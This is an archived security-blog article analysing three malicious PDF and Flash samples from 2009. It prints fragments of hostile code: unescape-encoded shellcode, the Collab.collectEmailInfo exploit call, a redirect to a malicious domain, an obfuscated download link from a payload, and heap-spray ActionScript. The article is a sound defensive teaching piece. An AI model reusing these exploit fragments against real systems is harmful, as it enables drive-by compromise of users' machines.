<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html lang="en"><head><script type="text/javascript" async="" src="Browser%20attack.%20Analysis%20of%20the%20malicious%20Flash%20objects%20and%20PDF%20documents_files/ga.js"></script><script src="Browser%20attack.%20Analysis%20of%20the%20malicious%20Flash%20objects%20and%20PDF%20documents_files/analytics.js" type="text/javascript"></script>
<script type="text/javascript">window.addEventListener('DOMContentLoaded',function(){var v=archive_analytics.values;v.service='wb';v.server_name='wwwb-app224.us.archive.org';v.server_ms=282;archive_analytics.send_pageview({});});</script>
<script type="text/javascript" src="Browser%20attack.%20Analysis%20of%20the%20malicious%20Flash%20objects%20and%20PDF%20documents_files/bundle-playback.js" charset="utf-8"></script>
<script type="text/javascript" src="Browser%20attack.%20Analysis%20of%20the%20malicious%20Flash%20objects%20and%20PDF%20documents_files/wombat.js" charset="utf-8"></script>
<script>window.RufflePlayer=window.RufflePlayer||{};window.RufflePlayer.config={"autoplay":"on","unmuteOverlay":"hidden"};</script>
<script type="text/javascript" src="Browser%20attack.%20Analysis%20of%20the%20malicious%20Flash%20objects%20and%20PDF%20documents_files/ruffle.js"></script>
<script type="text/javascript">
    __wm.pc(0.001);
    __wm.init("https://web.archive.org/web");
  __wm.wombat("http://nobunkum.ru:80/analytics/en-flash","20180406044450","https://web.archive.org/","web","https://web-static.archive.org/_static/",
	      "1522989890");
</script>
<link rel="stylesheet" type="text/css" href="Browser%20attack.%20Analysis%20of%20the%20malicious%20Flash%20objects%20and%20PDF%20documents_files/banner-styles.css">
<link rel="stylesheet" type="text/css" href="Browser%20attack.%20Analysis%20of%20the%20malicious%20Flash%20objects%20and%20PDF%20documents_files/iconochive.css">
<!-- End Wayback Rewrite JS Include -->

  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <title>Browser attack. Analysis of the malicious Flash objects and PDF documents</title>
  <!-- base href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/" -->
  <link rel="alternate" type="application/rss+xml" title="Журнал NO BUNKUM — Новости" href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/rss">
  <link rel="stylesheet" type="text/css" href="Browser%20attack.%20Analysis%20of%20the%20malicious%20Flash%20objects%20and%20PDF%20documents_files/style.css">
<!--[if lt IE 8]>
<link rel="stylesheet" type="text/css" href="/template/css/ie.css" />
<![endif]-->
<!--[if IE 6]>
<link rel="stylesheet" type="text/css" href="/template/css/ie6.css" />
<![endif]-->
</head>
<body><!-- BEGIN WAYBACK TOOLBAR INSERT -->
<script>__wm.rw(0);</script>
<div id="wm-ipp-base" lang="en" style="display: block; direction: ltr;">
</div><div id="wm-ipp-print">The Wayback Machine - https://web.archive.org/web/20180406044450/http://nobunkum.ru:80/analytics/en-flash</div>
<script type="text/javascript">//<![CDATA[
__wm.bt(725,27,25,2,"web","http://nobunkum.ru/analytics/en-flash","20180406044450",1996,"https://web-static.archive.org/_static/",["https://web-static.archive.org/_static/css/banner-styles.css?v=S1zqJCYt","https://web-static.archive.org/_static/css/iconochive.css?v=qtvMKcIJ"], false);
  __wm.rw(1);
//]]></script>
<!-- END WAYBACK TOOLBAR INSERT -->
 
      <div class="subscribe">
        
<form action="/web/20180406044450/http://nobunkum.ru/analytics/en-flash" method="post">
<div>
<input class="mail" type="text" name="email" placeholder="newsletter">
<input type="hidden" name="groups[]" value="1">
<input class="submit" type="submit" value="OK"></div>
</form>
      </div>
  <div id="header">
    <div id="title">
      <a id="logo" href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/"><img src="Browser%20attack.%20Analysis%20of%20the%20malicious%20Flash%20objects%20and%20PDF%20documents_files/logo.jpg" width="374" height="51" alt="NO BUNKUM"></a>
      <p>...on guns, germs, and steel of the digital age</p>
    </div>
    <div id="subtitle">
      <ul><li class="first"><a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/lookout/" title="Lookout" class="issue">Lookout</a></li>
<li class="current"><a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/analytics/" title="Analytics" class="issue">Analytics</a></li>
<li><a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/ru/" title="NO BUNKUM" class="issue">NO BUNKUM</a></li>
<li class="last"><a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/demo/" title="Demo" class="issue">Demo</a></li>
</ul>
      <div class="headerlinks">
        <a id="headerlink-about" href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/about" title="О журнале"><span>?</span></a>
        <a id="headerlink-rss" href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/rss" title="RSS"><span>RSS</span></a>
      </div>
    </div>
  </div>
  <div id="content">
    <div class="aside-long" style="text-align:center;padding:15px 10px">
      <span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/tags?tag=Exploit.SWF.Agent.br">Exploit.SWF.Agent.br</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/tags?tag=Pdfka.asd">Pdfka.asd</a></span>
<span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/tags?tag=Pidief.cvl">Pidief.cvl</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight2"><a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/tags?tag=TDSS">TDSS</a></span>
<span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/tags?tag=TDSS+removal">TDSS removal</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/tags?tag=binary+planting">binary planting</a></span>
<span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/tags?tag=bios+infection">bios infection</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/tags?tag=blind+sqli">blind sqli</a></span>
<span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/tags?tag=bootkit">bootkit</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/tags?tag=bootkit+remover">bootkit remover</a></span>
<span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/tags?tag=browser+exploitation">browser exploitation</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/tags?tag=com+hijacking">com hijacking</a></span>
<span class="tl-tag tl-tag-weight4"><a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/tags?tag=disassembling">disassembling</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/tags?tag=dll+hijacking">dll hijacking</a></span>
<span class="tl-tag tl-tag-weight2"><a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/tags?tag=drive-by+downloads">drive-by downloads</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/tags?tag=hack+online+banks">hack online banks</a></span>
<span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/tags?tag=heap-spray">heap-spray</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/tags?tag=hijack+botnet">hijack botnet</a></span>
<span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/tags?tag=ibank">ibank</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/tags?tag=kernel+protection">kernel protection</a></span>
<span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/tags?tag=kernel-mode+rootkit">kernel-mode rootkit</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/tags?tag=keylogger">keylogger</a></span>
<span class="tl-tag tl-tag-weight5"><a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/tags?tag=malware+analysis">malware analysis</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight2"><a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/tags?tag=rootkit+detection">rootkit detection</a></span>
<span class="tl-tag tl-tag-weight3"><a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/tags?tag=trojan">trojan</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/tags?tag=virus+removal">virus removal</a></span>
    </div>
    <!-- http://nobunkum.ru/flash/index.html -->
<div style="margin-top: -10px;">
<h1 id="content_title">Browser attack. Analysis of the malicious Flash objects and PDF documents.</h1>
<div id="article_author" class="author">Alisa Esage<br><a href="https://web.archive.org/web/20180406044450/http://twitter.com/alisaesage" target="_blank">@alisaesage</a></div>
<ul class="toc">
<li><a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/analytics/en-flash#intro">Introduction</a></li>
<li><a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/analytics/en-flash#analysis">Analysis of malicious files</a>
<ul>
<li><a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/analytics/en-flash#example1">Example 1. PDF + JavaScript</a></li>
<li><a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/analytics/en-flash#example2">Example 2. SWF</a></li>
<li><a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/analytics/en-flash#example3">Example 3. PDF + SWF</a></li>
</ul>
</li>
<li><a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/analytics/en-flash#conclusions">Conclusions</a></li>
<li><a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/analytics/en-flash#reference">Links</a></li>
</ul>
<h2 id="intro">Introduction</h2>
<p>Currently most of user infections with malicious code happen using 
the Web technologies. During the last year the number of such attacks 
increased more than threefold <a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/analytics/en-flash#reference">[1]</a>.
 The reason is a lot of opportunities for an attack, provided with a 
large number of potential “victims” in the Web and diversity of 
applications and libraries, used for the display of various types of Web
 content: from classic HTML and JavaScript to dynamic and office Flash, 
PDF, PPT (PowerPoint).</p>
<div class="aside">
<h4>The article is also available in <a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/ru/flash">Russian</a></h4>
</div>
<p>Nowadays malicious Adobe Flash movies and PDF documents are the most 
dangerous among all technologies of web-infection. More specifically, 
malicious PDF documents composed 80% of all discovered exploits to the 
end of 2009<a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/analytics/en-flash#reference">[2]</a>.
 As it will be shown below, efficiency of Trojan PDF documents is 
provided with vulnerabilities both in Adobe Acrobat/Reader and Adobe 
Flash.</p>
<p>We discuss the vulnerabilities in Adobe software just yet, because it
 prevails in the statistical reports of security companies. In fact the 
problem is more extensive: first of all it is the problem of 
vulnerabilities in popular data formats, secondly it is the problem of 
transparent integration of Web pages with different content types.</p>
<p>Let’s state the reasons, why the vector of mass infection via 
exploitation of vulnerabilities in the handlers of various data formats 
is the most dangerous currently and has the highest growth capacity.</p>
<p>1. Extensive attack vector.</p>
<p>Vulnerabilities in the technologies for the processing of popular 
data formats, integrated with web technologies, mostly are 
cross-platform, cross-browser and cross-format.</p>
<p>Cross-platform ability naturally follows the urge of monopolist 
vendors (like Adobe regarding PDF format) to get the maximum market 
shares. Application is compiled for different operation systems, but is 
based on the same source code with the same errors. Vulnerability 
CVE-2009-1862 can be taken as an example – malicious document with this 
vulnerability will be analyzed in the Example 3: 4 operation systems are
 the subjects to this vulnerability.</p>
<p>Cross-browser ability of vulnerability in data formats is provided 
with the fact that the processing of file format, which is external for a
 browser, is handled in independent application. File is either sent to 
external handler via plug-in and is displayed in browser window or opens
 in corresponding application via OS calls. Therefore, if file exploits 
the vulnerability of handler itself, then it will have an effect 
regardless vendor, version and actual updates of a browser.</p>
<p>Cross-format is provided with mutual technology integration: Flash 
movie can be embedded into PDF document, JavaScript code can exist 
inside PDF and Flash, and all three of them – Flash, PDF and JavaScript 
can be called from web-page code. Therefore single vulnerability can be 
exploited with the files of different types.</p>
<p>2. Integration of classic Web technologies with media content and 
office files grows as the Web is becoming more and more full-scale 
working environment. For the same reason browser developers try to make 
the usage of different files more transparent (e.g. display PDF in 
browser window instead of saving to the hard drive). It assists to the 
automation of mass infections.</p>
<p>3. Large volume of source code and development dynamics of the 
libraries for data formats processing contributes to a search and 
discovery of new vulnerabilities. For example, historical search in any 
database of vulnerabilities shows that the issue of Adobe Flash 
vulnerabilities is exhaustless.</p>
<p>4. Success of attacks via malicious office documents (like PDF and 
PPT) is still provided with social factor: it is psychologically easier 
for user to open unknown office document, than to launch Flash movie or 
executable file – it is pretty well-known that such files should be 
handled with caution.</p>
<p>5. Most of browsers are configured to launch Flash movies and open 
PDF documents automatically. Therefore vulnerability exploitation and 
execution of malicious code happen immediately after following the 
malicious link and downloading the content without user’s participation.</p>
<p>The goal of this article is to provide the system information about 
working mechanisms of such attacks and logical and instrumental basis 
for its analysis.</p>
<h2 id="analysis">Analysis of malicious files</h2>
<h3 id="example1">Example 1. PDF + JavaScript</h3>
<p>Let’s analyze the malicious PDF document (MD5: 
c251dcf3190701c46ee6a3f562df32e6), which is the most popular nowadays. 
This file was firstly discovered in <a href="https://web.archive.org/web/20180406044450/http://www.kaspersky.com/viruswatchlite?search_virus=pdfka.asd&amp;x=0&amp;y=0">December 2009</a> and almost immediately got into Top-20 of malicious soft in the Web <a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/analytics/en-flash#reference">[3]</a> (Pdfka.asd – 12th rank) and climbed 2 positions up in January<a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/analytics/en-flash#reference">[4]</a>
 (Pidief.cvl – 10th rank), still remaining the only PDF exploit within 
the considerable statistical limits (Note: you can find the copies of 
malicious files for this and further examples and the resulted files of 
analysis and processing in attached archive).</p>
<p>File size is about 10KB. If you open it in text editor, you will see the typical PDF signature in the header of the file: %PDF.</p>
<h4>PDF structure</h4>
<p>Structure of PDF file is simple and can be read with a naked eye. 
Initial data for the analysis of simple PDF exploits can be taken from 
the article by D. Stevens “Anatomy of Malicious PDF Documents” (in 
English)<a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/analytics/en-flash#reference">[5]</a>.
 PDF format is fully described in ISO 32000-1 standard and in 
corresponding reference manual. These documents can be downloaded from 
Adobe website<a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/analytics/en-flash#reference">[6]</a>.</p>
<p>Let’s analyze the structure of this malicious file.</p>
<p><img src="Browser%20attack.%20Analysis%20of%20the%20malicious%20Flash%20objects%20and%20PDF%20documents_files/flash01.png" alt="" width="600"></p>
<p>You can use <a href="https://web.archive.org/web/20180406044450/http://blog.didierstevens.com/programs/pdf-tools/">pdf-parser</a>
 utility to get a dump of PDF structure, optimized for analysis. 
Currently there is no need to use it, since PDF file is pretty small and
 all its structure is clearly visible. We can see a set of standard 
objects: catalog (1), content (2), list of pages (3), descriptor of 
single page (4), comments catalog (5), embedded JavaScript (6) and two 
stream-type objects (7 and 8). Mostly these data are packed with deflate
 algorithm (/FlateDecode).</p>
<p>During the analysis of potentially malicious PDF files you should 
firstly pay attention to active content. In this case embedded 
JavaScript script (6) is notable. Its data are stored in packed object 
(7). Packed script occupies 160 bytes only and is almost obscure while 
checking the PDF file structure.</p>
<h4>From PDF to a script</h4>
<p>Unpack the packed object using pdf-parser utility:</p>
<pre>&gt;pdf-parser.py -o 7 -f 0-sample &gt; 3-javascript-obj </pre>
<p>As a result we have very little script, which receives comments data 
(or annotations data, function getAnnots) and after some processing 
executes it as a script (function eval).</p>
<p><img src="Browser%20attack.%20Analysis%20of%20the%20malicious%20Flash%20objects%20and%20PDF%20documents_files/flash02.png" alt=""></p>
<p>Why getAnnots? Some of the top Google results for this function name 
show the CVE-2009-1492 vulnerability, which is connected with the error 
of comments processing in Adobe Acrobat. But as it can be seen from 
corresponding exploit<a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/analytics/en-flash#reference">[7]</a>,
 this vulnerability has nothing common with our case. Comments field is 
used just as a storage for massive part of the script to avoid the 
suspicions from a first glance.</p>
<p>Comments data, received by getAnnots function, are stored packed in stream-object (8), referred by Annot object (5).</p>
<p><img src="Browser%20attack.%20Analysis%20of%20the%20malicious%20Flash%20objects%20and%20PDF%20documents_files/flash03.png" alt="" width="600"></p>
<p>Unpack it as above and you will see the long string like 
z0dz0az0dz0az09:. Following actions should be done to convert this 
string into readable script:</p>
<p><img src="Browser%20attack.%20Analysis%20of%20the%20malicious%20Flash%20objects%20and%20PDF%20documents_files/flash04.png" alt=""></p>
<p>As you can see from the code, all ‘z’ symbols are changed into ‘%’ in
 the string, derived from annotation storage. ‘%’ symbol is a byte 
delimiter in hexadecimal code. Function unescape converts the 
hexadecimal sequence into binary code (sequence of ASCII symbols in our 
case). Decoding of unescape can be done with <a href="https://web.archive.org/web/20180406044450/http://malc0de.com/tools/decode/unescape.html">Decode Unescape</a> online script or any software for <a href="https://web.archive.org/web/20180406044450/http://home2.paulschou.net/tools/xlate/">HEX-ASCII</a> conversion.</p>
<p>String decoding results with pretty big and intentionally complicated (obfuscated) script (see attached file 7-script2).</p>
<h4>Obfuscated JavaScript</h4>
<p>How can we analyze intentionally complicated scripts? The first thing
 which makes a script to look horrifying is pseudorandom names of 
functions and variables (like v_8yD7D8CG__C). You can change these 
identifiers with something short to make a script more readable.</p>
<p>Then, functional part of a script should be highlighted: function or 
sequence of functions, doing the main job. In this case we find the core
 after checking the script by function names and JavaScript command 
directives (as opposed to variable identifiers, these ones can’t be 
obfuscated). This core is eval function. It calls following encrypted 
part of the script.</p>
<p><img src="Browser%20attack.%20Analysis%20of%20the%20malicious%20Flash%20objects%20and%20PDF%20documents_files/flash05.png" alt=""></p>
<p>There is no need to analyze the decrypting procedure – we can make 
the script to decrypt itself instead of that. Launch the script in 
corresponding environment (e.g. in a browser with JavaScript support) 
and change the eval function with document.write function. Thus 
decrypted script will be printed in browser window instead of execution.</p>
<p>In this case this trick doesn’t work due to debugging protection (see
 the file 8-script2-fail!.html). First of all, script uses its own code 
(arguments.callee<a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/analytics/en-flash#reference">[8]</a>) in decryption algorithm. Therefore algorithm works incorrectly after changing eval to document.write.</p>
<p><img src="Browser%20attack.%20Analysis%20of%20the%20malicious%20Flash%20objects%20and%20PDF%20documents_files/flash06.png" alt=""></p>
<p>Secondly, app variable is checked. This variable is initialized in 
JavaScript-environment (of the application (Adobe Acrobat in this case),
 and is not initialized in browser or any other JavaScript interpreter.</p>
<p><img src="Browser%20attack.%20Analysis%20of%20the%20malicious%20Flash%20objects%20and%20PDF%20documents_files/flash07.png" alt=""></p>
<p>Let’s summarize the script autodecryption algorithm despite these details.</p>
<ol>
<li>Original scripted code, wrapped in unescape function, should be substituted instead of arguments.callee variable.</li>
<li>Check of app variable should be avoided with any convenient way (e.g. with adding var app = true command into the script).</li>
<li>All calls for eval() functions should be replaced with document.write().</li>
<li>Angle brackets should be filtered from an argument to 
document.write() function. Otherwise these brackets will be processed by
 browser’s HTML-interpreter with output part.</li>
</ol>
<pre>function debrack(s) {
s=s.replace(/&gt;/g, "&amp;gt;");
s=s.replace(/&lt;/g, "&amp;lt;");
return(s);
}</pre>
<h4>From the script to a binary code</h4>
<p>Execution of modified script (see file 9-script2-ok.html) in the 
browser results with new portion of the code (see file a-script3). It is
 obfuscated in the same manner as previous one. It is the last and the 
central part of the script, since it doesn’t contain the calls of eval 
function.</p>
<p>Quick check of the script shows its functional core:</p>
<p>1. Multiple call of unescape function with long arguments like: "%u9090%u9090%u9090%u21eb%ub859:..".</p>
<p>You can find shell code in argument strings to unescape function, 
since mostly those bytes are encoded, which exceed the range of printed 
symbols [21h.. 7Eh]. Moreover, first string starts with several 90h 
bytes, which matches the NOP processor command.</p>
<p>2. this.collabStore = Collab.collectEmailInfo({subj: "", msg: D_3_0824mk});</p>
<p>This function is unusual for JavaScript and immediately attracts 
attention. Internet search by keywords brings to vulnerability 
CVE-2009-5659<a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/analytics/en-flash#reference">[9]</a> (and to the advertisements of commercial exploit packs).</p>
<p>Analysis of shell code and vulnerability itself is beyond the topic 
of this article. We want just to note that payload binary code 
(d-shellcode.exe-payload) includes the link to malicious module, which 
will be loaded and executed as a result of vulnerability exploitation. 
This link can be seen with a naked eye.</p>
<pre>thpt/:a/gfitbhtaewc.mon/etT/ERTS.3ype/2H85b9b9Vd10000f0700R6575c0ff101T2dbf77dd902l140903K431102 </pre>
<p>You can continue an investigation using the parts of the link in the 
search through the malicious links database malc0de.net, logs of public 
sandboxes etc.</p>
<h3 id="example2">Example 2. SWF</h3>
<p>As distinct from PDF documents with easy readable structure, Adobe 
Flash movies are more complicated for the analysis. Therefore at first 
we check the simple example of malicious Flash object: 
Trojan-Downloader.SWF.Small.fj (MD5: f8e4e4206586f566c5dddc74884e57df).</p>
<p>This is 232 bytes file. File starts with CWS signature – it corresponds with Flash format with compression<a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/analytics/en-flash#reference">[10]</a>. You can use <a href="https://web.archive.org/web/20180406044450/http://iancoog.altervista.org/">cws2fws</a> utility to decompress it. Analysis-ready Flash format without compression has FWS signature.</p>
<p>Flash is the binary format. Along with meta information and static 
media content it uses ActionScript script language to describe the 
compiled program, which provides all Flash dynamics and interactivity: 
from visual forms management to opening the web pages. You can use <a href="https://web.archive.org/web/20180406044450/http://www.swftools.org/">SWFTools</a> utility pack to analyze the file structure.</p>
<p>ActionScript program is the most interesting from the standpoint of potentially malicious content of Flash object. You can use <a href="https://web.archive.org/web/20180406044450/http://www.hp.com/go/swfscan">SWFScan</a> utility to decompile ActionScript and swfdump utility from SWFTools pack to get a dump of bytecode mnemonics.</p>
<p>Decompiled ActionScript of this file looks as follows:</p>
<p><img src="Browser%20attack.%20Analysis%20of%20the%20malicious%20Flash%20objects%20and%20PDF%20documents_files/flash08.png" alt=""></p>
<p>As you can see from the script, Flash object sends small script 
(this.getURL) to browser command string. Decoding of the script results 
with the string: window.location = 
"//pizdachesabuserov.xorg.pl/go/'+document.location.search+'";</p>
<p>So, this Flash movie redirects browser to another domain, sending 
some arguments with the current URL to this domain (part of URL after ? 
symbol). It is the part of scenario of mass infection of web users using
 the SEO Poisoning technology<a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/analytics/en-flash#reference">[11]</a>.</p>
<h3 id="example3">Example 3. PDF + SWF</h3>
<p>Now we know the principles of analysis of both PDF and SWF files. 
Let’s take more complicated case: Exploit.SWF.Agent.br (MD5: 
09a0f7aae0e22b5d80c7950890f3f738). It is relatively old exploit, 
discovered in July 2009, but it has made a lot of noise due to 
interesting features of the structure of malicious file<a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/analytics/en-flash#reference">[12]</a>.</p>
<p>It is PDF document of about 1 MB. Quick view at the file structure 
shows a lot of PDF objects, mixed with large blocks of binary data. 
Therefore it is reasonable to use pdf-parser utility to analyze the file
 structure.</p>
<h4>PDF structure</h4>
<p>Analysis of file structure (pdf-parser.py 0-sample &gt; 1-pdfparse) 
doesn’t show anything extraordinary. There are no scripts, only several 
ObjStm and XObject objects with unclear purpose.</p>
<p>Let’s analyze PDF more thoroughly, including the printout of unpacked
 binary data (pdf-parser.py -f 0-sample &gt; 2-streamfilter) into file 
structure dump. Our goal is to check if there is something suspicious in
 packed data.</p>
<p>Quick view over the largest blocks of unpacked data results with 
several images (/Subtype /Image - objects 29, 31, 5), metadata block 
(/Type /Metadata – object 6) and two suspicious blocks of embedded PDF 
layout (objects 33 and 7). More thorough analysis of one of the blocks 
(33) shows the links to two attached SWF files:</p>
<pre>&lt;&gt;/F(fancyBall.swf)/Type/Filespec/UF(fancyBall.swf)&gt;&gt;
&lt;&gt;/F(oneoff.swf)/Type/Filespec/UF(oneoff.swf)&gt;&gt;</pre>
<p>Ability to embed Flash objects into the PDF documents appeared in 
Adobe Reader starting with version 9 and is described in the Supplement 
to ISO 32000<a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/analytics/en-flash#reference">[13]</a>.</p>
<p>Second PDF object (7) includes the link to embedded image:</p>
<pre>&lt;&gt;/F(love_wallpaper_butterfly-dsc08951.jpg)</pre>
<p>We save the corresponding objects (2,3 and 4) for further analysis (pdf-parser.py -o 2 -d 0-sample &gt; 3- fancyball.swf etc.).</p>
<h4>Analysis of embedded PDF objects</h4>
<p>Decompilation of fancyball.swf program results with innocent script, 
copied from the examples to Flash Professional 9 ActionScript 3.0 
Preview<a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/analytics/en-flash#reference">[14]</a> (file 3.1-actionscript-decompile):</p>
<pre> public function Ball()
{
    trace("ball created: " + this.name);
    this.buttonMode = true;
    this.addEventListener(MouseEvent.CLICK, this.clickHandler);
    this.addEventListener(MouseEvent.MOUSE_DOWN, this.mouseDownListener);
    this.addEventListener(MouseEvent.MOUSE_UP, this.mouseUpListener);
    return;
}</pre>
<p>But the bytecode dump of the same script (swfdump -D 
3.0-fancyball.swf &gt; 3.2-actionscript-dump) shows that the 
initialization function of the script is substituted with the little 
code of unclear purpose:</p>
<pre>initmethod * init=()(0 params, 0 optional)
[stack:2 locals:1 scope:1-9 flags:]
{
    00000) + 0:0 pushshort 2049 
    00001) + 1:0 pushshort 12536
    00002) + 2:0 multiply
    00003) + 1:0 pushscope
    00004) + 0:1 getlex &lt;q&gt;[public]::void
    00005) + 1:1 nop
    00006) + 1:1 nop
:
    00033) + 1:1 returnvoid
}
</pre>
<p>The only purpose of the code above is to multiply two numbers in the 
stack (result of multiplication is an address within the heap) and to 
call the undeclared object (see the instructions for ActionScript 
virtual machine<a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/analytics/en-flash#reference">[15]</a>). After an interpretation of these instructions control is given to heap space (CVE-2009-1862).</p>
<p>And what do we have in the heap?</p>
<p>Let’s analyze the decompiled script of the second Flash object - oneoff.swf (file 4.1-actionscript-decompile).</p>
<p>1. Assigning of two local variables.</p>
<pre>internal function frame1()
{
    this.b = "";
    this.a = "";
</pre>
<p>As you can see in the bytecode dump, it is two numbers: 0x0c0c0c0c и 0x13131313.</p>
<pre>00002) + 0:1 findproperty &lt;q&gt;[public]::b
00003) + 1:1 pushstring "\0c\0c\0c\0c"
00004) + 2:1 initproperty &lt;q&gt;[public]::b
00005) + 0:1 findproperty &lt;q&gt;[public]::a
00006) + 1:1 pushstring "\13\13\13\13"
00007) + 2:1 initproperty &lt;q&gt;[public]::a</pre>
<p>2. Create 1 MB sequence of 0x13 byte (1048576=1024^2).</p>
<pre>while(this.b.length &lt; -1048576)
{
    this.b = this.b + this.a;
}</pre>
<p>3. Dynamic creation of an array in the heap.</p>
<pre>this.byteArr = new ByteArray();
</pre>
<p>4. Population of this array with generated sequence 64 times.</p>
<pre>this.byteArr = new ByteArray();
while(this.byteArr.length &lt; -1048576 * 64)
{
     byteArr.writeMultiByte(this.b, "iso-8859-1");
}</pre>
<p>5. Dynamic generation of shell code in the end of this array.</p>
<pre>... 
byteArr.writeByte(144);
byteArr.writeByte(144);
byteArr.writeByte(129);
byteArr.writeByte(236);
byteArr.writeByte(32);
byteArr.writeByte(1);
...</pre>
<p>Therefore, execution of the program of this Flash object fills the 
dynamic memory of a process with an array of 64 MB of neutral 
instructions (bytecode 0х13 corresponds with adc edx,[ebx] instruction) 
with shell code in the very end. It is a heap spray technique, providing
 the reliable execution of a shell code without its assigning to 
specific address in a memory of process, which captures control after 
vulnerability exploitation.</p>
<p>Shell code (we will not analyze its details here) decrypts and 
launches the malicious modules, included into the image file 
love_wallpaper_butterfly-dsc08951.jpg. These modules can be decrypted 
and highlighted manually - just pay an attention to the long sequences 
of 1 byte (0xA0, 0x37) in file code and suppose that they match with the
 result of stream XOR encryption of zero sequence, indicative for the 
header of executable module (see files 7-malware1.ex, 9.0-malware2).</p>
<p><img src="Browser%20attack.%20Analysis%20of%20the%20malicious%20Flash%20objects%20and%20PDF%20documents_files/flash09.png" alt=""></p>
<p>Along with executable modules, there is one more embedded PDF file in this “image” (8.0-emdedded.pdf).</p>
<h2 id="conclusions">Conclusion</h2>
<p>We would like to highlight several important points in our conclusion of example analysis.</p>
<p>1. Both vulnerabilities, exploited by analyzed malicious files, are cross-platform.</p>
<p>2. Vulnerability from the last example (CVE-2009-1862) is also 
cross-format: Adobe Flash objects can be executed as separate modules, 
can be embedded into web page or PDF document.</p>
<p>3. Therefore, exploit from the last example has a great potential for
 attack: there are several attack vectors (Flash at web pages, PDF 
documents) in four operation systems (Windows, Macintosh, Linux and 
Solaris<a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/analytics/en-flash#reference">[16]</a>). The same is true to a greater or lesser extent for any Flash vulnerability.</p>
<p>4. Two months have passed from the approximate date of vulnerability 
discovery (1st of June 2009 – date of vulnerability inclusion into CVE 
database) until the publication of patch by Adobe company (30th of July 
2009 – date of corresponding bulletin<a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/analytics/en-flash#reference">[17]</a>).</p>
<p>Addendum to article: <a href="https://web.archive.org/web/20180406044450/http://nobunkum.ru/files/nb2-flash-attachment.rar">nb2-flash-attachment.rar</a> (password is sent <a href="https://web.archive.org/web/20180406044450/mailto:alisa@esagelab.ru">by request</a>).</p>
<h2 id="reference">Links</h2>
